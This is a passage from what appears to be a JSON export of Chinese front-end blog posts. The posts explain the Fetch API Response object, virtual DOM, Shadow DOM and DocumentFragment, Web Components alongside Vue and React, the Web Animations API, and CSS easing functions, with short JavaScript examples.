undefined }); Response 对象 fetch() 方法返回一个 Promise，resolve 时得到一个 Response 对象。 属性 Response.headers 只读 包含此 Response 所关联的 Headers 对象。 Response.ok 只读 包含了一个布尔值，表示该 Response 成功（HTTP 状态码的范围在 200-299）。 Response.redirected 只读 表示该 Response 是否来自一个重定向，如果是的话，它的 URL 列表将会有多个条目。 Response.status 只读 包含 Response 的状态码（例如 200 表示成功）。 Response.statusText 只读 包含了与该 Response 状态码一致的状态信息（例如，OK 对应 200）。 Response.type 只读 包含 Response 的类型（例如，basic、cors）。 Response.url 只读 包含 Response 的 URL。 Response.body 只读 一个简单的 getter，用于暴露一个 ReadableStream 类型的 body 内容。 Response.bodyUsed 只读 包含了一个布尔值，表示该 Response 是否读取过 Body。 方法 Response.clone() 创建一个 Response 对象的克隆。 Response.error() 返回一个绑定了网络错误的新的 Response 对象。 Response.redirect() 用另一个 URL 创建一个新的 Response。 以下方法 Responses 对象被设置为了 stream 的方式，所以只能被读取一次： Response.arrayBuffer() 读取 Response 对象并且将它设置为已读，并返回一个被解析为 ArrayBuffer 格式的 Promise 对象。 Response.blob() 读取 Response 对象并且将它设置为已读，并返回一个被解析为 Blob 格式的 Promise 对象。 Response.formData() 读取Response 对象并且将它设置为已读，并返回一个被解析为 FormData 格式的 Promise 对象。 Response.json() 读取 Response 对象并且将它设置为已读，并返回一个被解析为 JSON 格式的 Promise 对象。 Response.text() 读取 Response 对象并且将它设置为已读，并返回一个被解析为 USVString 格式的 Promise 对象。 使用 const response = await fetch(&quot;https://lf3-cdn-tos.bytescm.com/obj/static/xitu_juejin_web//static/favicons/favicon-32x32.png&quot;); for (let [key, value] of response.headers) { console.log(`${key} : ${value}`); } response.headers.forEach( (value, key) =&gt; console.log(key, ':', value) ); console.log(response.headers.get('Content-Type')); const response = await fetch(&quot;https://api.juejin.cn/content_api/v1/author_center/task_list&quot;, { headers: { &quot;content-type&quot;: &quot;application/json&quot;, }, body: '{&quot;cursor&quot;:&quot;0&quot;,&quot;limit&quot;:10}', method: &quot;POST&quot;, credentials: &quot;include&quot; }); console.log(await response.clone().json()); 上传文件 上传二进制文件时，不用修改标头的 Content-Type，浏览器会自动设置。 方式一，已存在的表单元素：fetch(url, { body: new FormData(form:HTMLFormElement) })。 方式二，构造出一个表单对象： const input = document.querySelector('input[type=&quot;file&quot;]'); const data = new FormData(); data.append('file', input.files[0]); data.append('username', 'foo'); const response = fetch(url, { method: 'POST', body: data }); 方式三，直接上传二进制数据，将 Blob 或 ArrayBuffer 对象放在 body 属性里面： const blob = await new Promise(resolve =&gt; canvasElem.toBlob(resolve, 'image/png') ); const response = await fetch(url, { method: 'POST', body: blob }); 总结和对比 axios Fetch API 是 WHATWG 规范标准，axios 使用的是 XMLHttpRequest，都是基于 promise 的，在 IE 中都需要 promise Polyfill。 Fetch 没有 XMLHttpRequest.onprogress 事件，但可以通过 Response.body 接口返回的 ReadableStream 对象获取当前数据块大小，监测上传下载进度。 中断请求功能 可以通过 AbortController、AbortSignal API 实现。 拦截请求和响应功能 可以通过包装 fetch() 方法或 npm 库 fetch-intercept 实现。 ","link":"https://zkrisj.github.io/post/fetch-api-de-shi-yong/"},{"title":"关于 虚拟 DOM、Shadow DOM 和 DocumentFragment","content":"Virtual DOM 如果数据绑定将开发者从操作 DOM 中解放了出来，那虚拟 DOM 则为数据绑定提供了性能保证，还有分层设计、跨平台以及服务端渲染等特性。 原理 虚拟 DOM 本质上就是在 JS 和 DOM 之间做了一个缓存。可以类比 CPU（JS） 和硬盘（DOM），直接操作硬盘（DOM）很慢，我们就在它们之间加个内存（Virtual DOM），CPU（JS）只操作内存（Virtual DOM），最后再把变更写入硬盘（DOM）。 并且虚拟 DOM 还会使用 Diff 算法来计算出真正需要更新的节点，从而最大限度地减少 DOM 操作，提升性能。 虚拟 DOM 的实现主要包括三个部分： 用 JavaScript 对象模拟真实 DOM 树，对真实 DOM 进行抽象； diff 算法 — 比较两棵虚拟 DOM 树的差异； pach 算法(打补丁) — 将两个虚拟 DOM 对象的差异应用到真正的 DOM 树。 例如，一个 Vue 组件的 HTML 结构为： &lt;template&gt; &lt;div id=&quot;app&quot; class=&quot;container&quot;&gt; &lt;h1&gt;hello&lt;/h1&gt; &lt;/div&gt; &lt;/template&gt; Vue 在编译时会将 template 模板转换成 VNode 对象并缓存下来： { type:'div', props:{ id:'app', class:'container' }, children: [ { type: 'h1', children:'hello' } ] } 这样当组件状态数据发生变化时，会触发虚拟 DOM 数据的变化，然后 Vue 会通过 Diff 算法把数据发生变化后生成的 VNode 与前一次缓存下来的 VNode 进行对比，找出差异，然后只对有差异的的真实 DOM 节点进行更新。 可以看到，虚拟 DOM 的主要作用就是控制重新渲染。 那浏览器什么情况下会重新渲染？ 控制重绘（repaint）和回流（reflow）的频率 一个页面从加载到完成，首先需要构建 DOM 树，然后根据 DOM 节点的几何属性形成 render 树(渲染树)，当渲染树构建完成，页面就根据 DOM 树开始布局，渲染树也根据设置的样式对应的渲染这些节点。当 DOM 树改变时会发生回流，而当 DOM 树或者渲染树改变时都会发生重绘。 当我们增删 DOM 节点或修改一个元素的宽高时，页面布局就会发生变化，DOM 树结构也会发生变化，那么肯定要重新构建 DOM 树，而 DOM 树与渲染树是紧密相连的，DOM 树构建完，渲染树也会随之对页面进行再次渲染，这种引起 DOM 树结构变化，页面布局变化的行为叫回流。 当我们给一个元素更换颜色，这样的行为是不会影响页面布局的，DOM 树不会变化，但颜色变了，渲染树得重新渲染页面，这种只是样式的变化，不会引起DOM树变化，页面布局变化的行为叫重绘。 回流的代价要远大于重绘，且回流必然会造成重绘，但重绘不一定会造成回流。 大批量的操作 DOM 时，控制 重绘和回流 的频率非常重要，所以 Vue 或者 React 等框架都会使用 Diff 算法来控制重新渲染的频率和范围。 Diff 算法 是对虚拟 DOM 和真实 DOM 进行比对，并计算出最小的变化，然后再去根据这个最小的变化去更新真实的 DOM。简单说就是三步： 遍历老的虚拟 DOM； 遍历新的虚拟 DOM； 然后根据变化（改变或新增），再重新排序。 可是这样会有很大问题，假如有 1000 个节点，就需要计算 1000³ 次，也就是10亿次，这样性能消耗将非常巨大。所以 Vue 或者 React 里 Diff 算法都遵循深度优先，同层比较的策略来计算出最小变化。 虚拟 DOM 通过 Diff 算法进行批量替换，可以保证 DOM 大量或大范围操作下的性能下限，对视图进行合理、高效的更新，而真实 DOM 操作每次都需要重绘或回流，造成不必要的性能浪费。 跨平台 虚拟 DOM 提供了一个非常重要的特性：Parser 解析转化。这意味着其实相当多的东西我们都可以在编译阶段解决。比如考虑这样一个情况：我们是否可以编写一套转换器，用来把 python 代码转换为 js？这其中比较麻烦的就是 DOM，因为 DOM 是 js 中独有的东西，可是有了 虚拟 DOM，我们就可以在 python 中操作 虚拟 DOM 这样一个统一的抽象数据格式，这样不就实现了其他编程语言平台来编写前端代码？事实上 ssr（服务端渲染）就是这个原理：因为 node 是没有 DOM 的，通过虚拟 DOM 来抽象即可达到操作 DOM 的目的，还有我们在 jsx 里使用函数来声明式编写原本命令式的 DOM 操作也是这样。再比如我们可以把前端平台代码移植到其他平台，像 React Native、Flutter，很多小程序框架等。 另一种将大量 DOM 操作缓存到内存中的方法是 DocumentFragment。 DocumentFragment DocumentFragment 是一个定义了最小文档对象而没有父对象的接口。它被当作轻量级的 Document ，用来存储 DOM 对象。文档片段对实际 DOM 没有影响，但其子节点可以按需插入到实际的 DOM 里。 因为文档片段存在于内存中，并不在 DOM 树中，所以将子元素插入到文档片段时不会引起页面回流（对元素位置和几何上的计算）。因此，使用文档片段通常会带来更好的性能。 虚拟 DOM 源自 DocumentFragment 吗？ 虚拟 DOM 和文档片段采用相同的理念去提升 UI 的性能，但虚拟 DOM 不使用任何文档片段，通过查看 Vue 和 React 的源码也不会有 DocumentFragment，虚拟 DOM 具有一些独立的消除差异和渲染的阶段。 React 创建了 React.Fragment 语法，它可以包裹一组子元素而不额外引入新的 DOM 节点。但除了命名相似，React 片段和 DocumentFragment 没有任何关系。 function Glossary(props) { return ( &lt;dl&gt; {props.items.map(item =&gt; ( &lt;React.Fragment key={item.id}&gt; &lt;dt&gt;{item.term}&lt;/dt&gt; &lt;dd&gt;{item.description}&lt;/dd&gt; &lt;/React.Fragment&gt; ))} &lt;/dl&gt; ); } Shadow DOM 以前浏览器只提供了一种机制来将一段代码与另一段代码隔离开来： &lt;iframe&gt; 框架，但对于大多数封装需求，框架过于沉重，且有很多限制。 现在浏览器提供了一种编写真正封装的组件的方法： Shadow DOM，使得在没有工具或命名约定的情况下，将 CSS 与 HTML 标记捆绑在一起，封装成组件，简单说就是将隐藏的 DOM 树附加到常规的 DOM 树中。 通过使用 Element.attachShadow() 方法将一个 shadow DOM 附加到自定义元素上。你可以像普通 DOM 一样来操作 Shadow DOM，例如添加子节点、设置属性，以及为节点添加自己的样式（例如通过 element.style 属性），或者为整个 Shadow DOM 添加样式（例如在 &lt;style&gt; 元素内添加样式）。不同的是，Shadow DOM 内部的元素始终不会影响到它外部的元素（除了 :focus-within），这为封装提供了便利。 通过查看 ShadowRoot.prototype，可以发现其继承自 DocumentFragment，表明 Shadow DOM 是基于文档片段接口的。 组成 Shadow DOM 从一个 Shadow root 开始，包括以下几个部分： Shadow host：一个常规 DOM 节点，Shadow DOM 会被附加到这个节点上。 Shadow tree：Shadow DOM 内部的 DOM 树。 Shadow boundary：Shadow DOM 结束的地方，也是常规 DOM 开始的地方。 Shadow root: Shadow tree 的根节点。 比如一个自定义的 button 组件： &lt;better-button&gt; &lt;img src=&quot;gear.svg&quot; slot=&quot;icon&quot;&gt; &lt;span&gt;Settings&lt;/span&gt; &lt;/better-button&gt; 我们可以在检查元素中看到它的 Shadow DOM 结构： &lt;better-button&gt; #shadow-root &lt;style&gt; ... &lt;/style&gt; &lt;slot name=&quot;icon&quot;&gt; &lt;img src=&quot;gear.svg&quot; slot=&quot;icon&quot;&gt; &lt;/slot&gt; &lt;span id=&quot;wrapper&quot;&gt; &lt;slot&gt; &lt;span&gt;Settings&lt;/span&gt; &lt;/slot&gt; &lt;/span&gt; &lt;/better-button&gt; 浏览器自带一些封装的原生组件件元素，比如 &lt;video&gt;、 &lt;input&gt;、 &lt;select&gt; 等，在 &lt;video&gt; 它的 Shadow DOM 中，实际上就包含了一系列的按钮和其他控制器。 Shadow DOM 和 虚拟 DOM 是一回事吗？ 不一样。Shadow DOM 是一种浏览器技术，主要用于在 web 组件中封装变量和 CSS。虚拟 DOM 则是一种由 Javascript 类库基于浏览器 API 实现的概念。 与 Web Components 创建 Web Components 不一定必须要使用 Shadow DOM，但使用 Shadow DOM 创建自定义元素，意味着可以利用 CSS 作用域、DOM 操作和事件监听等功能。 ","link":"https://zkrisj.github.io/post/guan-yu-xu-ni-domshadow-dom-he-documentfragment/"},{"title":"DocumentFragment 的使用","content":"介绍 构建渲染树的任何改变都可能导致重绘或回流，例如： 添加、删除、更新 DOM 节点。 使用 display: none（回流和重绘）或 visibility: hidden（仅重绘，因为没有几何形状发生变化）隐藏 DOM 节点。 DOM 节点的移动和动画。 添加样式表或调整样式属性。 用户操作，例如调整窗口大小、更改字体大小或滚动页面。 以前我们可以使用节点的 cloneNode() 方法，在克隆的节点上进行操作，然后再用克隆的节点替换原始节点来优化性能，而现在我们可以使用 DocumentFragment。 DocumentFragment（文档片段），与 document 一样，没有父节点，存储由节点（Node）组成的文档结构。但它不是主 DOM 树的一部分，它的变化不会触发 DOM 树的重新渲染，且不会对性能产生影响。 因为文档片段存在于内存中，并不在 DOM 树中，所以将子元素插入到文档片段时不会引起页面回流（对元素位置和几何上的计算）。因此，使用文档片段通常会带来 更好的性能。 使用 文档片段接口没有特定属性和方法，都继承自其父接口 Node。 最常用的方法是使用 DocumentFragment 创建并组成一个 DOM 子树，然后将其插入到 DOM 中。这种情况下会插入片段的所有子节点，并留下一个空的 DocumentFragment。因为所有的节点会被一次插入到文档中，所以仅会发生一个重渲染的操作，而不是每个节点分别被插入到文档中从而发生多次重渲染的操作。 该接口在 Web 组件（Web components）中也非常有用：&lt;template&gt; 元素在其 HTMLTemplateElement.content 属性中包含了一个 DocumentFragment。 可以使用 document.createDocumentFragment 方法或者构造函数 new DocumentFragment() 来创建一个空的 DocumentFragment。 let fragement = document.createDocumentFragment(); console.log(fragement.nodeName); // #document-fragment console.log(fragement.nodeType); // 11 console.log(fragement.nodeValue); // null console.log(fragement.parentNode); // null fragement.append(document.createElement('p')); console.log(fragment.childElementCount); // 1 document.body.append(fragement); console.log(fragment.childElementCount); // 0 示例 比如，我们要在一个列表中插入 10000 个节点： &lt;button onclick=&quot;myFunction()&quot;&gt;document&lt;/button&gt; &lt;button onclick=&quot;myFunction2()&quot;&gt;DocumentFragment&lt;/button&gt; &lt;ul id=&quot;ul&quot;&gt; &lt;li&gt;0&lt;/li&gt; &lt;/ul&gt; 一个个的插入到 DOM，并计算所用时间： function myFunction() { console.time('document'); for (let i = 1; i &lt;= 10000; i++) { const li = document.createElement('li'); li.textContent = 'document'; ul.append(li); } console.timeEnd('document'); } 先把所有节点添加到 DocumentFragment，然后一次性插入 DOM，并计算所用时间： function myFunction2() { const fragment = new DocumentFragment(); console.time('DocumentFragment'); for (let i = 1; i &lt;= 10000; i++) { const li = document.createElement('li'); li.textContent = 'DocumentFragment'; fragment.append(li); } ul.appendChild(fragment); console.timeEnd('DocumentFragment'); } 可以看到使用 DocumentFragment 在处理大批量 DOM 操作时，可以节省很大的性能，在 DOM 操作越多时，这种优势越明显。 引用资料： 深入理解DocumentFragment -文档片段 网页性能管理详解 DOM DocumentFragments ","link":"https://zkrisj.github.io/post/documentfragment-de-shi-yong/"},{"title":"Web Components 和 Vue 组件、React 组件","content":"Web Components 以前我们一直在使用 &lt;input&gt;，&lt;video&gt;，&lt;select&gt; 这样的原生组件元素，现在我们可以自己去定义这些组件。 使用 Web Components 的主要好处是原生支持，这意味着可以不需要任何框架即可完成开发，也意味着这将有更低的网络请求，以及更稳定的迭代前景。当你面向的最终用户可能使用了不同的前端技术栈，或是当你希望将最终的应用与它使用的组件实现细节解耦时，它们会是理想的选择。有不少大公司充分利用了这项技术： Twitter：嵌入式推文使用 Web Components 构建 YouTube：该站点是使用 Web Components 构建的 Electronic Arts：该站点也是使用 Web Components 构建的 Adobe Spectrum：该站点是一个基于 Web Components 的 UI 框架产品 维基百科 根据 w3techs.com 的数据，在 Chrome 浏览器中查看的所有网站中，有超过 15% 的网站至少注册了一个自定义元素。相比之下，只有 2.3% 的网站使用 React。 安全 对安全级别要求较高的情况（比如金融行业产品），不应使用第三方库，必须使用原生技术，并且必须控制导入库的全部内容。因为对于像 React 这样的大型库，从一个版本迁移到另一个版本很难审核所有依赖库的错误和漏洞。 组件生命周期 Web Components 具有原生的组件生命周期回调支持，当其与文档的连接与断开时无需额外的外部状态标记，这使得当组件被移动或被移除等场景无需通过钩子函数即可获取，同时也无需 VDOM 去应对 Diff 元素变化。即回归纯粹，又更优于性能。 组织和调试 例如，当你尝试在 DOM 中查找 React 制作的组件时，您在 DOM 中看到了什么？Div, div, div... Header 在哪里？在 DOM 中查找 JSX 代码的反射可能会很头疼，当然 Vue 和 React 的 Chrome 插件也可以解决一些问题。对于 Web 组件，如果您定义了 my-super-header，而你将直接在 DOM 中看到你的组件。 Shadow DOM Web Components 的另一个优势是使用了 Shadow DOM，它可以做到对主 DOM 没有侵害性（CSS、事件的有效隔离），对混合 React 而言同时还能降低 Diff 成本。也可以结合 ES6 Module 来轻松的完成组件的按需加载。 对比 JSX 作为浏览器的原生支持，相比于 JSX 无需预编译预处理，而 JSX 在每次 render 时，都需要完整的构造一个虚拟DOM，并且它还需要 JSS 将 CSS-in-JS 转换为样式表。因此同样功能的 JSX 将占用更多的 CPU 运算。 由于使用了 Template，模版节点操作的对象是一个 DocumentFragement，而并非是真实 DOM 的一部分，相比 JSX 产生的 JS 堆栈其内存占用更小。 Vue 组件 Vue 组件的插槽机制是受原生 Web Component &lt;slot&gt; 元素的启发而诞生，同时还做了一些功能拓展。 一些开发者认为应该避免使用框架专有的组件模型，而改为全部使用自定义元素来构建应用，因为这样可以使应用“永不过时”。Vue 官方对此的解释是： 自定义元素和 Vue 组件之间确实存在一定程度的功能重叠：它们都允许我们定义具有数据传递、事件发射和生命周期管理的可重用组件。 Web Components 的 API 相对来说更底层和更基础（即功能太简单）。要构建一个实际的应用，我们需要相当多平台没有涵盖的附加功能： 一个声明式的、高效的模板系统；即数据绑定，这是 Web Components 缺少的。 一个响应式的，利于跨组件逻辑提取和重用的状态管理系统；即 Web Components 没有状态管理机制。 一种在服务器上呈现组件并在客户端“激活”(hydrate) 组件的高性能方法 (SSR)，这对 SEO 和 LCP 这样的 Web 关键指标非常重要。原生自定义元素 SSR 通常需要在 Node.js 中模拟 DOM，然后序列化更改后的 DOM，而 Vue SSR 则尽可能地将其编译为拼接起来的字符串，这会高效得多。即 Web Components 没有提供服务端渲染 (SSR) 方案。 Vue 的组件模型在设计时同时兼顾了这些需求，因此是一个更内聚的系统。 我们认为 Vue 和 Web Components 是互补的技术。Vue 为使用和创建自定义元素提供了出色的支持。无论你是将自定义元素集成到现有的 Vue 应用中，还是使用 Vue 来构建和分发自定义元素都很方便。 在 Vue 中使用 Web Components 浏览器内编译时的示例配置： // 仅在浏览器内编译时才会工作 app.config.compilerOptions.isCustomElement = (tag) =&gt; tag.includes('-') 使用了 Vite 构建工具示例配置： // vite.config.js import vue from '@vitejs/plugin-vue' export default { plugins: [ vue({ template: { compilerOptions: { // 将所有带短横线的标签名都视为自定义元素 isCustomElement: (tag) =&gt; tag.includes('-') } } }) ] } Vue CLI 示例配置： // vue.config.js module.exports = { chainWebpack: config =&gt; { config.module .rule('vue') .use('vue-loader') .tap(options =&gt; ({ ...options, compilerOptions: { // 将所有带 ion- 的标签名都视为自定义元素 isCustomElement: tag =&gt; tag.startsWith('ion-') } })) } } Vue 提供了一个和定义一般 Vue 组件几乎完全一致的 defineCustomElement 方法来支持创建自定义元素。这个方法接收的参数和 defineComponent 完全相同。但它会返回一个继承自 HTMLElement 的自定义元素构造器： import { defineCustomElement } from 'vue' const MyVueElement = defineCustomElement({ // 这里是同平常一样的 Vue 组件选项 props: {}, emits: {}, template: `...`, // defineCustomElement 特有的：注入进 shadow root 的 CSS styles: [`/* inlined css */`] }) // 注册自定义元素之后，所有此页面中的 `&lt;my-vue-element&gt;` 标签都会被升级 customElements.define('my-vue-element', MyVueElement) 注意问题： 通过 this.$emit 或者 setup 中的 emit 触发的事件都会通过以 CustomEvents 的形式从自定义元素上派发。额外的事件参数 (payload) 将会被暴露为 CustomEvent 对象上的一个 detail 数组。 不支持作用域插槽。当传递具名插槽时，应使用 slot attribute 而不是 v-slot 指令： &lt;my-element&gt; &lt;div slot=&quot;named&quot;&gt;hello&lt;/div&gt; &lt;/my-element&gt; Provide / Inject API 和相应的组合式 API 在 Vue 定义的自定义元素中都可以正常工作。但是请注意，依赖关系只在自定义元素之间起作用。例如一个 Vue 定义的自定义元素就无法注入一个由常规 Vue 组件所提供的属性。 SFC 中的 &lt;style&gt; 在生产环境构建时仍然会被抽取和合并到一个单独的 CSS 文件中。当正在使用 SFC 编写自定义元素时，通常需要改为注入 &lt;style&gt; 标签到自定义元素的 shadow root 上，以“自定义元素模式”导入 SFC (需要 @vitejs/plugin-vue@^1.4.0 或 vue-loader@^16.5.0)。要开启这个模式，只需要将你的组件文件以 .ce.vue 结尾即可： import { defineCustomElement } from 'vue' import Example from './Example.ce.vue' console.log(Example.styles) // [&quot;/* 内联 css */&quot;] // 转换为自定义元素构造器 const ExampleElement = defineCustomElement(Example) customElements.define('my-example', ExampleElement) React 组件 React 官方对 React 组件和 Web Components 的关系给出的解释： React 和 Web Components 为了解决不同的问题而生。 Web Components 为可复用组件提供了强大的封装，而 React 则提供了声明式的解决方案，使 DOM 与数据保持同步。 两者旨在互补。作为开发人员，可以自由选择在 Web Components 中使用 React，或者在 React 中使用 Web Components，或者两者共存。 在 React 中使用 Web Components Web Components 通常暴露的是命令式 API。例如，Web Components 的组件 video 可能会公开 play() 和 pause() 方法。要访问 Web Components 的命令式 API，你需要使用 ref 直接与 DOM 节点进行交互。如果你使用的是第三方 Web Components，那么最好的解决方案是编写 React 组件包装该 Web Components。 class XSearch extends HTMLElement { connectedCallback() { const mountPoint = document.createElement('span'); this.attachShadow({ mode: 'open' }).appendChild(mountPoint); const name = this.getAttribute('name'); const url = 'https://www.google.com/search?q=' + encodeURIComponent(name); const root = ReactDOM.createRoot(mountPoint); root.render(&lt;a href={url}&gt;{name}&lt;/a&gt;); } } customElements.define('x-search', XSearch); class HelloMessage extends React.Component { render() { // Web Components 中使用 class 属性代替 className return &lt;div&gt;Hello &lt;x-search class=&quot;demo&quot;&gt;{this.props.name}&lt;/x-search&gt;!&lt;/div&gt;; } } 注意问题： Web Components 触发的事件可能无法通过 React 渲染树正确的传递。你需要在 React 组件中手动添加事件处理器来处理这些事件。 如果使用 Babel 来转换 class，此代码将不会起作用。可以在加载 Web Components 前请引入 custom-elements-es5-adapter 来解决。 ","link":"https://zkrisj.github.io/post/web-components-he-vue-zu-jian-react-zu-jian/"},{"title":"Web Components 的使用","content":"介绍 Vue、React 等前端框架的核心特性就是数据绑定和组件复用。而现在浏览器已经实现了自己的 Web Components API，允许创建可重用的定制元素，并且在 web 应用中使用它们。 接口和 CSS 属性 window.customElements 返回 CustomElementRegistry 对象的引用，用来注册和查询已注册自定义元素。 customElements.define(name, constructor, options); 没有返回值。 name，自定义元素名，自定义元素的名称必须包含连词线，用以区别原生的 HTML 元素。 constructor，自定义元素构造器。 options 可选，控制元素如何定义。目前有一个选项支持： extends 指定继承的已创建的元素。被用于创建自定义元素。 定义在自定义元素的类定义中的生命周期回调函数 connectedCallback：当自定义元素第一次被连接到文档 DOM 时被调用。 disconnectedCallback：当自定义元素与文档 DOM 断开连接时被调用。 adoptedCallback：当自定义元素被移动到新文档时被调用。 attributeChangedCallback：当自定义元素的一个属性被增加、移除或更改时被调用。 与自定义元素特别相关的伪类 :defined：匹配任何已定义的元素，包括内置元素和使用 CustomElementRegistry.define() 定义的自定义元素。 :host：选择 shadow DOM 的 shadow host，内容是它内部使用的 CSS（containing the CSS it is used inside）。 :host()：选择 shadow DOM 的 shadow host，内容是它内部使用的 CSS（这样您可以从 shadow DOM 内部选择自定义元素）— 但只匹配给定方法的选择器的 shadow host 元素。 :host-context(): 选择 shadow DOM 的 shadow host，内容是它内部使用的 CSS（这样您可以从 shadow DOM 内部选择自定义元素）— 但只匹配给定方法的选择器匹配元素的子 shadow host 元素。 slots 相关的伪元素 ::slotted：匹配任何已经插入一个 slot 的内容。 shadow DOM 将一个隐藏的、独立的 DOM 附加到一个元素上，从而将标记结构、样式和行为隐藏起来，并与页面上的其他代码相隔离，保证不同的部分不会混在一起，可使代码更加干净、整洁。 custom elements 类型 不继承其他内建的 HTML 元素。直接把它们写成 HTML 标签的形式，来在页面上使用。例如 &lt;popup-info&gt;，或者是 document.createElement(&quot;popup-info&quot;)。 继承自基本的 HTML 元素。在创建时，必须指定所需扩展的元素；使用时，需要先写出基本的元素标签，并通过 is 属性指定 custom element 的名称。例如 &lt;p is=&quot;word-count&quot;&gt;, 或者 document.createElement(&quot;p&quot;, { is: &quot;word-count&quot; })。 使用 创建一个类或函数来指定 web 组件的功能，并继承 HTMLElement（或子类）。 使用 &lt;template&gt; 和 &lt;slot&gt; 定义一个 HTML 模板。 使用 customElements.define(name, constructor, options) 方法注册自定义元素 ，并向其传递要定义的元素名称、指定元素功能的类、以及可选的其所继承自的元素。 使用 Element.attachShadow() 方法获取 shadow DOM，使用通常的 DOM 方法向 shadow DOM 中添加子元素、事件监听器等。 示例 引用资料： 如何基于 WebComponents 封装 UI 组件库 Web Components 入门实例教程 HTML slot 插槽元素深入 ","link":"https://zkrisj.github.io/post/web-components-de-shi-yong/"},{"title":"Web Animations API 的使用","content":"介绍 Web Animations API 可以把 CSS3 实现的 animation 动画由 JS 代码实现。它通过组合两个模型来实现：时序模型（CSS transitions）和动画模型（CSS animations）。 接口 document.getAnimations() 返回当前对文档中的元素有效的 Animation 对象的数组。 Element.getAnimations() 返回正在或即将影响当前元素的 Animation 对象的数组。 Element.animate(keyframes, options) 用于在元素上创建和播放动画，返回创建的 Animation 对象实例。 keyframes 可以为任何css 动画属性 属性名称使用驼峰命名法指定，例如 background-color 变成 backgroundColor，background-position-x 变成 backgroundPositionX。也可以使用简写属性，例如 margin。 两个特殊的 css 属性： float, 必须写成 cssFloat ，因为 float 是 JavaScript 的关键字。 offset, 必须写成 cssOffset ，因为 offset 已经用来表示关键帧的偏移量。 还可以指定以下特殊属性： offset 关键帧的偏移量，介于 0.0 和 1.0 之间的数字或为 null。这相当于在 CSS 样式表中使用 @keyframes 以百分比指定开始和结束状态。如果为 null 或未指定，则关键帧将在相邻关键帧之间均匀分布。 easing 从当前 keyframe 到下一个 keyframe 所使用的 timing function。 composite 将 keyframe 中指定的值与基础值组合。 options 表示动画持续时间（以毫秒为单位）的整数，或包含以下一项或多项的对象： delay 延迟开始的毫秒数。默认为 0。 direction 动画的方向。默认为 normal，其他值包括：reverse，alternate，alternate-reverse。 duration 动画每次迭代完成所需的毫秒数。默认为 0。虽然这是可选的，但请记住，如果此值为 0，您的动画将不会运行。 easing 动画随时间变化的速率。接受预定义值 linear、ease、ease-in、ease-out 和 ease-in-out，或自定义 cubic-bezier 值，如 cubic-bezier( 0.42、0、0.58、1)。默认为 linear。 endDelay 动画结束后延迟的毫秒数。这主要用于根据另一个动画的结束时间对动画进行排序时使用。默认为 0。 fill 决定动画的效果是否应该先播放第一帧（backwards），在动画完成播放后保留最后一帧（forwards），或两者都有（both）。默认两者都不（none）。 iterationStart 描述动画应该在迭代中的哪个点开始。例如，0.5 表示在第一次迭代的中途开始，并且使用此值设置后，具有两次迭代的动画将在第三次迭代的中途结束。默认为 0.0。 iterations 动画重复的次数。默认为 1，也可以取 Infinity，使其在元素存在时重复。 iterationComposite 动画中如何迭代。可以设置为 accumulate 或 replace。默认 replace。 composite 如何在此动画和其他未指定其 composite 的单独动画之间组合。默认 replace，即用新值覆盖以前的值。其他值包括：add：例如 translateX(-200px) 和以前的 rotate(20deg) 会变成 translateX(-200px) rotate(20deg)；accumulate：例如 blur(2) 和 blur(5) 会变成 blur(7)。 使用 一个由多个关键帧（keyframe）的属性和值组成的对象所构成的数组： element.animate([ { // from opacity: 0, color: &quot;#fff&quot; }, { // to opacity: 1, color: &quot;#000&quot; } ], 2000); 对每个关键帧的偏移可以通过提供一个offset来指定： element.animate([ { opacity: 1 }, { opacity: 0.1, offset: 0.7 }, { opacity: 0 } ], 2000); offset 的值必须是在 [0.0, 1.0] 这个区间内，且须升序排列。并非所有的关键帧都需要设置 offset。没有指定 offset 的关键帧将与相邻的关键帧均匀间隔。 通过提供 easing 过渡来给指定关键帧之间应用过渡效果： element.animate([ { opacity: 1, easing: 'ease-out' }, { opacity: 0.1, easing: 'ease-in' }, { opacity: 0 } ], 2000); 指定的 easing 仅适用于指定它的关键帧到下一帧之间。但是在 options 中指定的 easing 值都将应用在一个动画的整个持续时间里。 包含动画的属性和要循环变化的值的数组： element.animate({ opacity: [ 0, 1 ], // [ from, to ] color: [ &quot;#fff&quot;, &quot;#000&quot; ] // [ from, to ] }, 2000); 每个数组的元素数量不必相等，所提供的值将独立分开： element.animate({ opacity: [ 0, 1 ], // offset: 0, 1 backgroundColor: [ &quot;red&quot;, &quot;yellow&quot;, &quot;green&quot; ], // offset: 0, 0.5, 1 }, 2000); offset，easing 和 composite 可以与属性值一起指定： element.animate({ opacity: [ 0, 0.9, 1 ], offset: [ 0, 0.8 ], // [ 0, 0.8, 1 ] 的简写 easing: [ 'ease-in', 'ease-out' ], }, 2000); 示例 下面示例的四个动画都使用了三个关键帧：第一帧完全透明，第二帧完全不透明，第三帧完全透明。offset 对应 CSS3 animation 中的百分比，{ opacity: 1, offset: 0.5 } 等同于 CSS 中 @keyframes xxx { 50% { opacity: 1; } }，也就是动画进程 50% 位置透明度为 1。不设置 offset 和 offset 设置为 0.5 都将在相邻关键帧之间均匀分布，效果相同。easing: 'steps(8, end)' 定义了一个 timing function，以等距步长划分动画进程。 ","link":"https://zkrisj.github.io/post/web-animations-api-de-shi-yong/"},{"title":"CSS easing-function 的使用","content":"介绍 easing-function 描述数值变化率的数学函数，可用于 transition-timing-function 属性和 animation-timing-function 属性。这使得可以在动画持续时间内改变动画的速度，还可在颜色渐变中的两种颜色之间进行插值。 语法 /* linear function */ linear; /* cubic-bezier functions */ cubic-bezier(x1, y1, x2, y2); ease; ease-in; ease-out; ease-in-out; /* step functions */ steps(4, end); step-start; step-end; linear：从头到尾以恒定速率进行，相当于 cubic-bezier(0.0, 0.0, 1.0, 1.0)。 cubic-bezier() 函数：定义贝塞尔曲线，由四个点组成。由于这些曲线是连续的，它们通常用于平滑插值的开始和结束，因此有时称为 easing 函数。纵坐标 y1 和 y2 如果超出 [0, 1] 的范围，将产生弹跳效果。横坐标 x1 和 x2 必须在 [0, 1] 范围内，否则 CSS 将忽略整个属性。 有几个常见的贝塞尔曲线函数的关键字： ease：开始缓慢，然后急剧加速，然后逐渐变慢。相当于 cubic-bezier(0.25, 0.1, 0.25, 1.0)。与 ease-in-out 类似，但它在开始时加速更快。 ease-in：动画缓慢开始，然后逐渐加速直到结束，在结束点时突然停止。相当于 cubic-bezier(0.42, 0.0, 1.0, 1.0)。 ease-in-out：动画缓慢开始，然后加速，最后减速直至结束。相当于 cubic-bezier(0.42, 0.0, 0.58, 1.0)。开始时类似于 ease-in，结束时类似于 ease-out。 ease-out：动画突然开始，然后逐渐减速至结束。相当于 cubic-bezier(0.0, 0.0, 0.58, 1.0)。 steps() 